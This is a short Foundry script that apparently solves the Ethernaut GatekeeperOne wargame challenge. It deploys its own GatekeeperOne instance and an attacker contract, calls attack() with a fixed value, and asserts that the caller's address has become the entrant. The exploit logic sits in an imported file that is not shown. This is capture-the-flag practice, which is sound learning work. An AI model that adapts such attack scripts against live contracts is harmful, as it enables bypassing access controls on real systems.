// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/GatekeeperOne.sol";
import "../src/GatekeeperOneAttacker.sol";

contract AttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address myAddress = vm.envAddress("MY_ADDRESS");
        // address target = vm.envAddress("PRIVACY_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        GatekeeperOne gatekeeper = new GatekeeperOne();
        GatekeeperOneAttacker attacker = new GatekeeperOneAttacker();
        attacker.attack(address(gatekeeper), 48468705645490337);
        require(gatekeeper.entrant() != address(0), "still 0 address");
        require(gatekeeper.entrant() == myAddress, "attack failed");
        vm.stopBroadcast();
    }
}
